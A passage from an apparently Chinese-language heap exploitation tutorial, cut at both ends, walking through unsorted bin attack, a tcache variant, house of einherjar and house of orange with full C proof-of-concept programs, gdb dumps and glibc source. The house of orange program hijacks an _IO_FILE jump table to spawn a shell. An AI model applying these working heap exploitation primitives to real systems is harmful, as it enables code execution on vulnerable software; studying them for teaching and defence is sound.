0x00007fffffffdcb0 gdb-peda$ x/26gx 0x0000555555756000+0x10 0x555555756010: 0x0700000000000000 0x0700000000000000 <-- counts <-- counts 0x555555756020: 0x0000000000000000 0x0000000000000000 0x555555756030: 0x0000000000000000 0x0000000000000000 0x555555756040: 0x0000000000000000 0x0000000000000000 0x555555756050: 0x0000000000000000 0x0000000000000000 0x555555756060: 0x0000000000000000 0x0000000000000000 0x555555756070: 0x0000000000000000 0x0000000000000000 0x555555756080: 0x0000000000000000 0x0000555555756670 <-- entries 0x555555756090: 0x0000000000000000 0x0000000000000000 0x5555557560a0: 0x0000000000000000 0x0000000000000000 0x5555557560b0: 0x0000000000000000 0x0000000000000000 0x5555557560c0: 0x0000000000000000 0x00007fffffffdcc0 <-- entries 0x5555557560d0: 0x0000000000000000 0x0000000000000000 \u53ef\u4ee5\u770b\u5230\u5728 malloc \u65f6\uff0cfake chunk \u88ab\u4e0d\u65ad\u91cd\u590d\u5730\u94fe\u63a5\u5230 tcache bin\uff0c\u76f4\u5230\u88c5\u6ee1\u540e\uff0c\u624d\u4ece unsorted bin \u91cc\u53d6\u51fa\u3002\u540c\u6837\u7684\uff0cfake chunk \u7684 fd \u6307\u5411 unsorted bin\u3002 unsorted_bin_attack #include <stdio.h> #include <stdlib.h> int main() { unsigned long stack_var = 0; fprintf(stderr, \"The target we want to rewrite on stack: %p -> %ld\\n\\n\", &stack_var, stack_var); unsigned long *p = malloc(0x80); unsigned long *p1 = malloc(0x10); fprintf(stderr, \"Now, we allocate first small chunk on the heap at: %p\\n\",p); free(p); fprintf(stderr, \"We free the first chunk now. Its bk pointer point to %p\\n\", (void*)p[1]); p[1] = (unsigned long)(&stack_var - 2); fprintf(stderr, \"We write it with the target address-0x10: %p\\n\\n\", (void*)p[1]); malloc(0x80); fprintf(stderr, \"Let's malloc again to get the chunk we just free: %p -> %p\\n\", &stack_var, (void*)stack_var); } $ gcc -g unsorted_bin_attack.c $ ./a.out The target we want to rewrite on stack: 0x7ffc9b1d61b0 -> 0 Now, we allocate first small chunk on the heap at: 0x1066010 We free the first chunk now. Its bk pointer point to 0x7f2404cf5b78 We write it with the target address-0x10: 0x7ffc9b1d61a0 Let's malloc again to get the chunk we just free: 0x7ffc9b1d61b0 -> 0x7f2404cf5b78 unsorted bin \u653b\u51fb\u901a\u5e38\u662f\u4e3a\u66f4\u8fdb\u4e00\u6b65\u7684\u653b\u51fb\u505a\u51c6\u5907\u7684\uff0c\u6211\u4eec\u77e5\u9053 unsorted bin \u662f\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff0c\u5728\u5206\u914d\u65f6\u4f1a\u901a\u8fc7 unlink \u64cd\u4f5c\u5c06 chunk \u4ece\u94fe\u8868\u4e2d\u79fb\u9664\uff0c\u6240\u4ee5\u5982\u679c\u80fd\u591f\u63a7\u5236 unsorted bin chunk \u7684 bk \u6307\u9488\uff0c\u5c31\u53ef\u4ee5\u5411\u4efb\u610f\u4f4d\u7f6e\u5199\u5165\u4e00\u4e2a\u6307\u9488\u3002\u8fd9\u91cc\u901a\u8fc7 unlink \u5c06 libc \u7684\u4fe1\u606f\u5199\u5165\u5230\u6211\u4eec\u53ef\u63a7\u7684\u5185\u5b58\u4e2d\uff0c\u4ece\u800c\u5bfc\u81f4\u4fe1\u606f\u6cc4\u6f0f\uff0c\u4e3a\u8fdb\u4e00\u6b65\u7684\u653b\u51fb\u63d0\u4f9b\u4fbf\u5229\u3002 unlink \u7684\u5bf9 unsorted bin \u7684\u64cd\u4f5c\u662f\u8fd9\u6837\u7684\uff1a /* remove from unsorted list */ unsorted_chunks (av)->bk = bck; bck->fd = unsorted_chunks (av); \u5176\u4e2d bck = victim->bk \u3002 \u9996\u5148\u5206\u914d\u4e24\u4e2a chunk\uff0c\u7136\u540e\u91ca\u653e\u6389\u7b2c\u4e00\u4e2a\uff0c\u5b83\u5c06\u88ab\u52a0\u5165\u5230 unsorted bin \u4e2d\uff1a gef\u27a4 x/26gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000091 <-- chunk 1 [be freed] 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000090 0x0000000000000020 <-- chunk 2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 <-- top chunk 0x6020c0: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/4gx &stack_var-2 0x7fffffffdc50: 0x00007fffffffdd60 0x0000000000400712 0x7fffffffdc60: 0x0000000000000000 0x0000000000602010 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE) \u7136\u540e\u5047\u8bbe\u5b58\u5728\u4e00\u4e2a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u4fee\u6539 chunk 1 \u7684\u6570\u636e\u3002\u7136\u540e\u6211\u4eec\u5c06 chunk 1 \u7684 bk \u6307\u9488\u4fee\u6539\u4e3a\u6307\u5411\u76ee\u6807\u5730\u5740 - 2\uff0c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u662f\u5728\u76ee\u6807\u5730\u5740\u5904\u6709\u4e00\u4e2a fake free chunk\uff0c\u7136\u540e malloc\uff1a gef\u27a4 x/26gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000091 <-- chunk 3 0x602010: 0x00007ffff7dd1b78 0x00007fffffffdc50 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000090 0x0000000000000021 <-- chunk 2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 <-- top chunk 0x6020c0: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/4gx &stack_var-2 0x7fffffffdc50: 0x00007fffffffdc80 0x0000000000400756 <-- fake chunk 0x7fffffffdc60: 0x00007ffff7dd1b78 0x0000000000602010 <-- fd->TAIL \u4ece\u800c\u6cc4\u6f0f\u4e86 unsorted bin \u7684\u5934\u90e8\u5730\u5740\u3002 \u90a3\u4e48\u7ee7\u7eed\u6765\u770b libc-2.27 \u91cc\u600e\u4e48\u5904\u7406\uff1a #include <stdio.h> #include <stdlib.h> int main() { unsigned long stack_var = 0; fprintf(stderr, \"The target we want to rewrite on stack: %p -> %ld\\n\\n\", &stack_var, stack_var); unsigned long *p = malloc(0x80); unsigned long *p1 = malloc(0x10); fprintf(stderr, \"Now, we allocate first small chunk on the heap at: %p\\n\",p); free(p); fprintf(stderr, \"Freed the first chunk to put it in a tcache bin\\n\"); p[0] = (unsigned long)(&stack_var); fprintf(stderr, \"Overwrite the next ptr with the target address\\n\"); malloc(0x80); malloc(0x80); fprintf(stderr, \"Now we malloc twice to make tcache struct's counts '0xff'\\n\\n\"); free(p); fprintf(stderr, \"Now free again to put it in unsorted bin\\n\"); p[1] = (unsigned long)(&stack_var - 2); fprintf(stderr, \"Now write its bk ptr with the target address-0x10: %p\\n\\n\", (void*)p[1]); malloc(0x80); fprintf(stderr, \"Finally malloc again to get the chunk at target address: %p -> %p\\n\", &stack_var, (void*)stack_var); } $ gcc -g tcache_unsorted_bin_attack.c $ ./a.out The target we want to rewrite on stack: 0x7ffef0884c10 -> 0 Now, we allocate first small chunk on the heap at: 0x564866907260 Freed the first chunk to put it in a tcache bin Overwrite the next ptr with the target address Now we malloc twice to make tcache struct's counts '0xff' Now free again to put it in unsorted bin Now write its bk ptr with the target address-0x10: 0x7ffef0884c00 Finally malloc again to get the chunk at target address: 0x7ffef0884c10 -> 0x7f69ba1d8ca0 \u6211\u4eec\u77e5\u9053\u7531\u4e8e tcache \u7684\u5b58\u5728\uff0cmalloc \u4ece unsorted bin \u53d6 chunk \u7684\u65f6\u5019\uff0c\u5982\u679c\u5bf9\u5e94\u7684 tcache bin \u8fd8\u672a\u88c5\u6ee1\uff0c\u5219\u4f1a\u5c06 unsorted bin \u91cc\u7684 chunk \u5168\u90e8\u653e\u8fdb\u5bf9\u5e94\u7684 tcache bin\uff0c\u7136\u540e\u518d\u4ece tcache bin \u4e2d\u53d6\u51fa\u3002\u90a3\u4e48\u95ee\u9898\u5c31\u6765\u4e86\uff0c\u5728\u653e\u8fdb tcache bin \u7684\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0cmalloc \u4f1a\u4ee5\u4e3a\u6211\u4eec\u7684 target address \u4e5f\u662f\u4e00\u4e2a chunk\uff0c\u7136\u800c\u8fd9\u4e2a \"chunk\" \u662f\u8fc7\u4e0d\u4e86\u68c0\u67e5\u7684\uff0c\u5c06\u629b\u51fa \"memory corruption\" \u7684\u9519\u8bef\uff1a while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av)) { bck = victim->bk; if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize_nomask (victim) > av->system_mem, 0)) malloc_printerr (\"malloc(): memory corruption\"); \u90a3\u4e48\u8981\u60f3\u8df3\u8fc7\u653e chunk \u7684\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u5c31\u9700\u8981\u5bf9\u5e94 tcache bin \u7684 counts \u57df\u4e0d\u5c0f\u4e8e tcache_count\uff08\u9ed8\u8ba4\u4e3a7\uff09\uff0c\u4f46\u5982\u679c counts \u4e0d\u4e3a 0\uff0c\u8bf4\u660e tcache bin \u91cc\u662f\u6709 chunk \u7684\uff0c\u90a3\u4e48 malloc \u7684\u65f6\u5019\u4f1a\u76f4\u63a5\u4ece tcache bin \u91cc\u53d6\u51fa\uff0c\u4e8e\u662f\u5c31\u6ca1\u6709 unsorted bin \u4ec0\u4e48\u4e8b\u4e86\uff1a if (tc_idx < mp_.tcache_bins /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */ && tcache && tcache->entries[tc_idx] != NULL) { return tcache_get (tc_idx); } \u8fd9\u5c31\u9020\u6210\u4e86\u77db\u76fe\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u627e\u5230\u4e00\u79cd\u65e2\u80fd\u4ece unsorted bin \u4e2d\u53d6 chunk\uff0c\u53c8\u4e0d\u4f1a\u5c06 chunk \u653e\u8fdb tcache bin \u7684\u529e\u6cd5\u3002 \u4e8e\u662f\u5c31\u5f97\u5230\u4e86\u4e0a\u9762\u7684\u5229\u7528 tcache poisoning\uff08\u53c2\u8003\u7ae0\u82824.14\uff09\uff0c\u5c06 counts \u4fee\u6539\u6210\u4e86 0xff \uff0c\u4e8e\u662f\u5728\u8fdb\u884c\u5230\u4e0b\u9762\u8fd9\u91cc\u65f6\u5c31\u4f1a\u8fdb\u5165 else \u5206\u652f\uff0c\u76f4\u63a5\u53d6\u51fa chunk \u5e76\u8fd4\u56de\uff1a #if USE_TCACHE /* Fill cache first, return to user only if cache fills. We may return one of these chunks later. */ if (tcache_nb && tcache->counts[tc_idx] < mp_.tcache_count) { tcache_put (victim, tc_idx); return_cached = 1; continue; } else { #endif check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; \u4e8e\u662f\u5c31\u6210\u529f\u6cc4\u9732\u51fa\u4e86 unsorted bin \u7684\u5934\u90e8\u5730\u5740\u3002 house_of_einherjar #include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> #include <malloc.h> int main() { uint8_t *a, *b, *d; a = (uint8_t*) malloc(0x10); int real_a_size = malloc_usable_size(a); memset(a, 'A', real_a_size); fprintf(stderr, \"We allocate 0x10 bytes for 'a': %p\\n\\n\", a); size_t fake_chunk[6]; fake_chunk[0] = 0x80; fake_chunk[1] = 0x80; fake_chunk[2] = (size_t) fake_chunk; fake_chunk[3] = (size_t) fake_chunk; fake_chunk[4] = (size_t) fake_chunk; fake_chunk[5] = (size_t) fake_chunk; fprintf(stderr, \"Our fake chunk at %p looks like:\\n\", fake_chunk); fprintf(stderr, \"prev_size: %#lx\\n\", fake_chunk[0]); fprintf(stderr, \"size: %#lx\\n\", fake_chunk[1]); fprintf(stderr, \"fwd: %#lx\\n\", fake_chunk[2]); fprintf(stderr, \"bck: %#lx\\n\", fake_chunk[3]); fprintf(stderr, \"fwd_nextsize: %#lx\\n\", fake_chunk[4]); fprintf(stderr, \"bck_nextsize: %#lx\\n\\n\", fake_chunk[5]); b = (uint8_t*) malloc(0xf8); int real_b_size = malloc_usable_size(b); uint64_t* b_size_ptr = (uint64_t*)(b - 0x8); fprintf(stderr, \"We allocate 0xf8 bytes for 'b': %p\\n\", b); fprintf(stderr, \"b.size: %#lx\\n\", *b_size_ptr); fprintf(stderr, \"We overflow 'a' with a single null byte into the metadata of 'b'\\n\"); a[real_a_size] = 0; fprintf(stderr, \"b.size: %#lx\\n\\n\", *b_size_ptr); size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk); *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size; fprintf(stderr, \"We write a fake prev_size to the last %lu bytes of a so that it will consolidate with our fake chunk\\n\", sizeof(size_t)); fprintf(stderr, \"Our fake prev_size will be %p - %p = %#lx\\n\\n\", b-sizeof(size_t)*2, fake_chunk, fake_size); fake_chunk[1] = fake_size; fprintf(stderr, \"Modify fake chunk's size to reflect b's new prev_size\\n\"); fprintf(stderr, \"Now we free b and this will consolidate with our fake chunk\\n\"); free(b); fprintf(stderr, \"Our fake chunk size is now %#lx (b.size + fake_prev_size)\\n\", fake_chunk[1]); d = malloc(0x10); memset(d, 'A', 0x10); fprintf(stderr, \"\\nNow we can call malloc() and it will begin in our fake chunk: %p\\n\", d); } $ gcc -g house_of_einherjar.c $ ./a.out We allocate 0x10 bytes for 'a': 0xb31010 Our fake chunk at 0x7ffdb337b7f0 looks like: prev_size: 0x80 size: 0x80 fwd: 0x7ffdb337b7f0 bck: 0x7ffdb337b7f0 fwd_nextsize: 0x7ffdb337b7f0 bck_nextsize: 0x7ffdb337b7f0 We allocate 0xf8 bytes for 'b': 0xb31030 b.size: 0x101 We overflow 'a' with a single null byte into the metadata of 'b' b.size: 0x100 We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk Our fake prev_size will be 0xb31020 - 0x7ffdb337b7f0 = 0xffff80024d7b5830 Modify fake chunk's size to reflect b's new prev_size Now we free b and this will consolidate with our fake chunk Our fake chunk size is now 0xffff80024d7d6811 (b.size + fake_prev_size) Now we can call malloc() and it will begin in our fake chunk: 0x7ffdb337b800 house-of-einherjar \u662f\u4e00\u79cd\u5229\u7528 malloc \u6765\u8fd4\u56de\u4e00\u4e2a\u9644\u8fd1\u5730\u5740\u7684\u4efb\u610f\u6307\u9488\u3002\u5b83\u8981\u6c42\u6709\u4e00\u4e2a\u5355\u5b57\u8282\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u8986\u76d6\u6389 next chunk \u7684 size \u5b57\u6bb5\u5e76\u6e05\u9664 PREV_IN_USE \u6807\u5fd7\uff0c\u7136\u540e\u8fd8\u9700\u8981\u8986\u76d6 prev_size \u5b57\u6bb5\u4e3a fake chunk \u7684\u5927\u5c0f\u3002\u5f53 next chunk \u88ab\u91ca\u653e\u65f6\uff0c\u5b83\u4f1a\u53d1\u73b0\u524d\u4e00\u4e2a chunk \u88ab\u6807\u8bb0\u4e3a\u7a7a\u95f2\u72b6\u6001\uff0c\u7136\u540e\u5c1d\u8bd5\u5408\u5e76\u5806\u5757\u3002\u53ea\u8981\u6211\u4eec\u7cbe\u5fc3\u6784\u9020\u4e00\u4e2a fake chunk\uff0c\u8ba9\u5408\u5e76\u540e\u7684\u5806\u5757\u8303\u56f4\u5230 fake chunk \u5904\uff0c\u90a3\u4e0b\u4e00\u6b21 malloc \u5c06\u8fd4\u56de\u6211\u4eec\u60f3\u8981\u7684\u5730\u5740\u3002\u6bd4\u8d77\u524d\u9762\u6240\u8bb2\u8fc7\u7684 poison-null-byte \uff0c\u66f4\u52a0\u5f3a\u5927\uff0c\u4f46\u662f\u8981\u6c42\u7684\u6761\u4ef6\u4e5f\u66f4\u591a\u4e00\u70b9\uff0c\u6bd4\u5982\u4e00\u4e2a\u5806\u4fe1\u606f\u6cc4\u6f0f\u3002 \u9996\u5148\u5206\u914d\u4e00\u4e2a\u5047\u8bbe\u5b58\u5728 off_by_one \u6ea2\u51fa\u7684 chunk a\uff0c\u7136\u540e\u5728\u6808\u4e0a\u521b\u5efa\u6211\u4eec\u7684 fake chunk\uff0cchunk \u5927\u5c0f\u968f\u610f\uff0c\u53ea\u8981\u662f small chunk \u5c31\u53ef\u4ee5\u4e86\uff1a gef\u27a4 x/8gx a-0x10 0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x603010: 0x4141414141414141 0x4141414141414141 0x603020: 0x4141414141414141 0x0000000000020fe1 <-- top chunk 0x603030: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/8gx &fake_chunk 0x7fffffffdcb0: 0x0000000000000080 0x0000000000000080 <-- fake chunk 0x7fffffffdcc0: 0x00007fffffffdcb0 0x00007fffffffdcb0 0x7fffffffdcd0: 0x00007fffffffdcb0 0x00007fffffffdcb0 0x7fffffffdce0: 0x00007fffffffddd0 0xffa7b97358729300 \u63a5\u4e0b\u6765\u521b\u5efa chunk b\uff0c\u5e76\u5229\u7528 chunk a \u7684\u6ea2\u51fa\u5c06 size \u5b57\u6bb5\u8986\u76d6\u6389\uff0c\u6e05\u9664\u4e86 PREV_INUSE \u6807\u5fd7\uff0cchunk b \u5c31\u4f1a\u4ee5\u4e3a\u524d\u4e00\u4e2a chunk \u662f\u4e00\u4e2a free chunk \u4e86\uff1a gef\u27a4 x/8gx a-0x10 0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x603010: 0x4141414141414141 0x4141414141414141 0x603020: 0x4141414141414141 0x0000000000000100 <-- chunk b 0x603030: 0x0000000000000000 0x0000000000000000 \u539f\u672c chunk b \u7684 size \u5b57\u6bb5\u5e94\u8be5\u4e3a 0x101\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u9009\u62e9 malloc(0xf8) \u4f5c\u4e3a chunk b \u4e5f\u662f\u51fa\u4e8e\u65b9\u4fbf\u7684\u76ee\u7684\uff0c\u8986\u76d6\u540e\u53ea\u5f71\u54cd\u4e86\u6807\u5fd7\u4f4d\uff0c\u6ca1\u6709\u5f71\u54cd\u5230\u5927\u5c0f\u3002 \u63a5\u4e0b\u6765\u6839\u636e fake chunk \u5728\u6808\u4e0a\u7684\u4f4d\u7f6e\u4fee\u6539 chunk b \u7684 prev_size \u5b57\u6bb5\u3002\u8ba1\u7b97\u65b9\u6cd5\u662f\u7528 chunk b \u7684\u8d77\u59cb\u5730\u5740\u51cf\u53bb fake chunk \u7684\u8d77\u59cb\u5730\u5740\uff0c\u540c\u65f6\u4e3a\u4e86\u7ed5\u8fc7\u68c0\u67e5\uff0c\u8fd8\u9700\u8981\u5c06 fake chunk \u7684 size \u5b57\u6bb5\u4e0e chunk b \u7684 prev_size \u5b57\u6bb5\u76f8\u5339\u914d\uff1a gef\u27a4 x/8gx a-0x10 0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x603010: 0x4141414141414141 0x4141414141414141 0x603020: 0xffff800000605370 0x0000000000000100 <-- chunk b <-- prev_size 0x603030: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/8gx &fake_chunk 0x7fffffffdcb0: 0x0000000000000080 0xffff800000605370 <-- fake chunk <-- size 0x7fffffffdcc0: 0x00007fffffffdcb0 0x00007fffffffdcb0 0x7fffffffdcd0: 0x00007fffffffdcb0 0x00007fffffffdcb0 0x7fffffffdce0: 0x00007fffffffddd0 0xadeb3936608e0600 \u91ca\u653e chunk b\uff0c\u8fd9\u65f6\u56e0\u4e3a PREV_INUSE \u4e3a\u96f6\uff0cunlink \u4f1a\u6839\u636e prev_size \u53bb\u5bfb\u627e\u4e0a\u4e00\u4e2a free chunk\uff0c\u5e76\u5c06\u5b83\u548c\u5f53\u524d chunk \u5408\u5e76\u3002\u4ece arena \u91cc\u53ef\u4ee5\u770b\u5230\uff1a gef\u27a4 heap arenas Arena (base=0x7ffff7dd1b20, top=0x7fffffffdcb0, last_remainder=0x0, next=0x7ffff7dd1b20, next_free=0x0, system_mem=0x21000) \u5408\u5e76\u7684\u8fc7\u7a0b\u5728 poison-null-byte \u90a3\u91cc\u4e5f\u8bb2\u8fc7\u4e86\u3002 \u6700\u540e\u5f53\u6211\u4eec\u518d\u6b21 malloc\uff0c\u5176\u8fd4\u56de\u7684\u5730\u5740\u5c06\u662f fake chunk \u7684\u5730\u5740\uff1a gef\u27a4 x/8gx &fake_chunk 0x7fffffffdcb0: 0x0000000000000080 0x0000000000000021 <-- chunk d 0x7fffffffdcc0: 0x4141414141414141 0x4141414141414141 0x7fffffffdcd0: 0x00007fffffffdcb0 0xffff800000626331 0x7fffffffdce0: 0x00007fffffffddd0 0xbdf40e22ccf46c00 house_of_orange #include <stdio.h> #include <stdlib.h> #include <string.h> int winner (char *ptr); int main() { char *p1, *p2; size_t io_list_all, *top; p1 = malloc(0x400 - 0x10); top = (size_t *) ((char *) p1 + 0x400 - 0x10); top[1] = 0xc01; p2 = malloc(0x1000); io_list_all = top[2] + 0x9a8; top[3] = io_list_all - 0x10; memcpy((char *) top, \"/bin/sh\\x00\", 8); top[1] = 0x61; _IO_FILE *fp = (_IO_FILE *) top; fp->_mode = 0; // top+0xc0 fp->_IO_write_base = (char *) 2; // top+0x20 fp->_IO_write_ptr = (char *) 3; // top+0x28 size_t *jump_table = &top[12]; // controlled memory jump_table[3] = (size_t) &winner; *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8 malloc(1); return 0; } int winner(char *ptr) { system(ptr); return 0; } $ gcc -g house_of_orange.c $ ./a.out *** Error in `./a.out': malloc(): memory corruption: 0x00007f3daece3520 *** ======= Backtrace: ========= /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f3dae9957e5] /lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7f3dae9a013e] /lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f3dae9a2184] ./a.out[0x4006cc] /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f3dae93e830] ./a.out[0x400509] ======= Memory map: ======== 00400000-00401000 r-xp 00000000 08:01 919342 /home/firmy/how2heap/a.out 00600000-00601000 r--p 00000000 08:01 919342 /home/firmy/how2heap/a.out 00601000-00602000 rw-p 00001000 08:01 919342 /home/firmy/how2heap/a.out 01e81000-01ec4000 rw-p 00000000 00:00 0 [heap] 7f3da8000000-7f3da8021000 rw-p 00000000 00:00 0 7f3da8021000-7f3dac000000 ---p 00000000 00:00 0 7f3dae708000-7f3dae71e000 r-xp 00000000 08:01 398989 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f3dae71e000-7f3dae91d000 ---p 00016000 08:01 398989 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f3dae91d000-7f3dae91e000 rw-p 00015000 08:01 398989 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f3dae91e000-7f3daeade000 r-xp 00000000 08:01 436912 /lib/x86_64-linux-gnu/libc-2.23.so 7f3daeade000-7f3daecde000 ---p 001c0000 08:01 436912 /lib/x86_64-linux-gnu/libc-2.23.so 7f3daecde000-7f3daece2000 r--p 001c0000 08:01 436912 /lib/x86_64-linux-gnu/libc-2.23.so 7f3daece2000-7f3daece4000 rw-p 001c4000 08:01 436912 /lib/x86_64-linux-gnu/libc-2.23.so 7f3daece4000-7f3daece8000 rw-p 00000000 00:00 0 7f3daece8000-7f3daed0e000 r-xp 00000000 08:01 436908 /lib/x86_64-linux-gnu/ld-2.23.so 7f3daeef4000-7f3daeef7000 rw-p 00000000 00:00 0 7f3daef0c000-7f3daef0d000 rw-p 00000000 00:00 0 7f3daef0d000-7f3daef0e000 r--p 00025000 08:01 436908 /lib/x86_64-linux-gnu/ld-2.23.so 7f3daef0e000-7f3daef0f000 rw-p 00026000 08:01 436908 /lib/x86_64-linux-gnu/ld-2.23.so 7f3daef0f000-7f3daef10000 rw-p 00000000 00:00 0 7ffe8eba6000-7ffe8ebc7000 rw-p 00000000 00:00 0 [stack] 7ffe8ebee000-7ffe8ebf1000 r--p 00000000 00:00 0 [vvar] 7ffe8ebf1000-7ffe8ebf3000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall] $ whoami firmy $ exit Aborted (core dumped) house-of-orange \u662f\u4e00\u79cd\u5229\u7528\u5806\u6ea2\u51fa\u4fee\u6539 _IO_list_all \u6307\u9488\u7684\u5229\u7528\u65b9\u6cd5\u3002\u5b83\u8981\u6c42\u80fd\u591f\u6cc4\u6f0f\u5806\u548c libc\u3002\u6211\u4eec\u77e5\u9053\u4e00\u5f00\u59cb\u7684\u65f6\u5019\uff0c\u6574\u4e2a\u5806\u90fd\u5c5e\u4e8e top chunk\uff0c\u6bcf\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5c31\u4ece top chunk \u4e2d\u5212\u51fa\u8bf7\u6c42\u5927\u5c0f\u7684\u5806\u5757\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u4e8e\u662f top chunk \u5c31\u8d8a\u6765\u8d8a\u5c0f\u3002 \u5f53\u67d0\u4e00\u6b21 top chunk \u7684\u5269\u4f59\u5927\u5c0f\u5df2\u7ecf\u4e0d\u80fd\u591f\u6ee1\u8db3\u8bf7\u6c42\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528\u51fd\u6570 sysmalloc() \u5206\u914d\u65b0\u5185\u5b58\uff0c\u8fd9\u65f6\u53ef\u80fd\u4f1a\u53d1\u751f\u4e24\u79cd\u60c5\u51b5\uff0c\u4e00\u79cd\u662f\u76f4\u63a5\u6269\u5145 top chunk\uff0c\u53e6\u4e00\u79cd\u662f\u8c03\u7528 mmap \u5206\u914d\u4e00\u5757\u65b0\u7684 top chunk\u3002\u5177\u4f53\u8c03\u7528\u54ea\u4e00\u79cd\u65b9\u6cd5\u662f\u7531\u7533\u8bf7\u5927\u5c0f\u51b3\u5b9a\u7684\uff0c\u4e3a\u4e86\u80fd\u591f\u4f7f\u7528\u524d\u4e00\u79cd\u6269\u5c55 top chunk\uff0c\u9700\u8981\u8bf7\u6c42\u5c0f\u4e8e\u9600\u503c mp_.mmap_threshold \uff1a if (av == NULL || ((unsigned long) (nb) >= (unsigned long) (mp_.mmap_threshold) && (mp_.n_mmaps < mp_.n_mmaps_max))) { \u540c\u65f6\uff0c\u4e3a\u4e86\u80fd\u591f\u8c03\u7528 sysmalloc() \u4e2d\u7684 _int_free() \uff0c\u9700\u8981 top chunk \u5927\u4e8e MINSIZE \uff0c\u5373 0x10\uff1a if (old_size >= MINSIZE) { _int_free (av, old_top, 1); } \u5f53\u7136\uff0c\u8fd8\u5f97\u7ed5\u8fc7\u4e0b\u9762\u4e24\u4e2a\u9650\u5236\u6761\u4ef6\uff1a /* If not the first time through, we require old_size to be at least MINSIZE and to have prev_inuse set. */ assert ((old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & (pagesize - 1)) == 0)); /* Precondition: not enough current space to satisfy nb request */ assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE)); \u5373\u6ee1\u8db3 old_size \u5c0f\u4e8e nb+MINSIZE \uff0c PREV_INUSE \u6807\u5fd7\u4f4d\u4e3a 1\uff0c old_top+old_size \u9875\u5bf9\u9f50\u8fd9\u51e0\u4e2a\u6761\u4ef6\u3002 \u9996\u5148\u5206\u914d\u4e00\u4e2a\u5927\u5c0f\u4e3a 0x400 \u7684 chunk\uff1a gef\u27a4 x/4gx p1-0x10 0x602000: 0x0000000000000000 0x0000000000000401 <-- chunk p1 0x602010: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/4gx p1-0x10+0x400 0x602400: 0x0000000000000000 0x0000000000020c01 <-- top chunk 0x602410: 0x0000000000000000 0x0000000000000000 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0ctop chunk \u5927\u5c0f\u4e3a 0x21000\uff0c\u51cf\u53bb 0x400\uff0c\u6240\u4ee5\u6b64\u65f6\u7684\u5927\u5c0f\u4e3a 0x20c00\uff0c\u53e6\u5916 PREV_INUSE \u88ab\u8bbe\u7f6e\u3002 \u73b0\u5728\u5047\u8bbe\u5b58\u5728\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u4fee\u6539 top chunk \u7684\u6570\u636e\uff0c\u4e8e\u662f\u6211\u4eec\u5c06 size \u5b57\u6bb5\u4fee\u6539\u4e3a 0xc01\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u6ee1\u8db3\u4e0a\u9762\u6240\u8bf4\u7684\u6761\u4ef6\uff1a gef\u27a4 x/4gx p1-0x10+0x400 0x602400: 0x0000000000000000 0x0000000000000c01 <-- top chunk 0x602410: 0x0000000000000000 